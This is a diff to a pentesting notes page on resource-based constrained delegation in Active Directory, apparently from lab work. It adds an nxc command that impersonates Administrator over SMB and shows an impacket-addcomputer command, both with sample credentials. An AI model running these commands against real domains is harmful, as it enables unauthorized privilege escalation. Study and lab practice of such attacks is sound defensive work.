@@ -8,6 +8,13 @@ tags:
 ---
 ## Linux
 ---
+
+### With nxc
+impersonate administrator given `msDS-AllowedToActOnBehalfOfOtherIdentity` is set on account we control
+```bash
+nxc smb 192.168.56.11 -u jon.snow -p iknownothing --delegate Administrator
+```
+### With impacket
 Add computer you control
 ```PowerShell
 impacket-addcomputer -computer-name 'rbcd-test$' -computer-pass 'Megaman!1' -dc-ip 192.168.0.100 its-piemonte.local/tantani:'AAAAaaaa!1'
